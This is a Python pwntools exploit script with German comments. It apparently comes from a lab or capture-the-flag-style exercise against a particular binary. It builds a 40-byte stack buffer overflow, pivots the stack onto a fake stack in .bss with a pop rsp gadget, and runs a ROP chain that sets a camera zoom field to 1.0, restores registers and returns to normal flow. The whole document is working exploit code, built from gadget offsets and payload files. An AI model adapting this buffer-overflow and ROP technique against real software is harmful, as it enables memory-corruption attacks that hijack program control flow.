#!/usr/bin/env python3
from pwn import *
import struct

def p64(val):
    """Packt einen 64-Bit-Wert im Little-Endian-Format."""
    return struct.pack("<Q", val)

# -----Adressen (Beispielwerte, bitte anpassen!)-----
# Basis-Adresse der Library
basisLibary = 0x7ffff7600000 

# Gadget: pop rdi ; ret (z. B. aus der Library)
pop_rdi_ret = 0x10f75b + basisLibary
rdi = 0x7fffffffd248  # ursprünglicher rdi vor Overflow

# Gadget: pop rsi ; ret (z. B. aus der Library)
pop_rsi_ret = 0x110a4d + basisLibary
rsi = 0x7fffffffd120  # ursprünglicher rsi vor Overflow

# Gadget: mov dword ptr [rdi], esi ; ret
mov_dword_ptr_rdi_esi_ret = 0x9c434 + basisLibary

# Gadget: pop rsi ; pop rbp ; ret (aus der Haupt-Binary)
pop_rsi_pop_rbp_ret = 0x406b58
rbp = 0x7fffffffd420  # ursprünglicher rbp vor Overflow

# Adresse von Instruktion nach der setZoom()-Funktion (Sprungziel)
afterSetZoom = 0x4035a5

# Adresse des theCamera._zoom-Feldes
theCamera_zoom = 0x7fffffffd1c0

# Bitmuster für 1.0 als 32-Bit Float (IEEE-754)
value_1_0 = 0x000000003F800000

# -----Fake-Stack-----
# .bss der Binary beginnt laut readelf bei 0x411020.
# Wähle hier einen sicheren, schadbaren Bereich.
fake_stack_addr = 0x411020 + 0x030  # Beispieloffset innerhalb der .bss

# Gadget: pop rsp ; ret – damit pivotieren wir auf den Fake Stack.
pop_rsp_ret = 0x3c068 + basisLibary
rsp = 0x7fffffffd1a0
#sonst 0x7fffffffd1a0

# -----Erstellen des ursprünglichen Payloads (nur der Stack Pivot)-----
# Hier überschreibst du nur so weit bis zum Pivot-Gadget.
payload = b"A" * 40 # 32 Byte für den char-Array + 8 Byte für den gespeicherten rbp

# An dieser Stelle müssen wir den Stackzeiger o. g. pivotieren.
payload += p64(pop_rsp_ret)      # Gadget: pop rsp ; ret
payload += p64(fake_stack_addr)    # Setze rsp auf unseren Fake Stack

# -----Erstellen der kompletten ROP-Kette im Fake Stack-----
# Diese ROP-Kette entspricht deiner ursprünglichen Chain.
fake_rop = b""
# 1. Setze theCamera._zoom auf 1.0
fake_rop += p64(pop_rdi_ret)
fake_rop += p64(theCamera_zoom)         # rdi = Adresse von theCamera._zoom
fake_rop += p64(pop_rsi_ret)
fake_rop += p64(value_1_0)                # rsi = 1.0 (als 32-Bit Float)
fake_rop += p64(mov_dword_ptr_rdi_esi_ret)  # Schreibe rsi an theCamera._zoom

# 2. Stelle Registerwerte (rdi, rsi, rbp) wieder her, wie sie vor dem Overflow waren
fake_rop += p64(pop_rdi_ret)
fake_rop += p64(rdi)                    # rdi Wiederherstellung
fake_rop += p64(pop_rsi_pop_rbp_ret)
fake_rop += p64(rsi)                    # rsi Wiederherstellung
fake_rop += p64(rbp)                    # rbp Wiederherstellung

#payload += p64(pop_rsp_ret)
#payload += p64(rsp)

# 3. Als Abschluss kehre zum Programmfluss zurück.
fake_rop += p64(afterSetZoom)

# -----Speichern der Payloads in Dateien-----
# Der Initial Payload wird an die Zielanwendung geschickt.
with open("payload.bin", "wb") as f:
    f.write(payload)
# Die Fake ROP-Kette muss in den Fake-Stack geschrieben werden.
# Wie du diesen Bereich tatsächlich beschreibst, hängt vom Szenario ab – typischerweise
# über einen separaten Schreibvorgang oder einen read()-Aufruf.
with open("fake_rop.bin", "wb") as f:
    f.write(fake_rop)

print("Payload (Stack Pivot) und Fake ROP-Kette wurden erstellt.")
print("Fake-Stack Adresse: " + hex(fake_stack_addr))
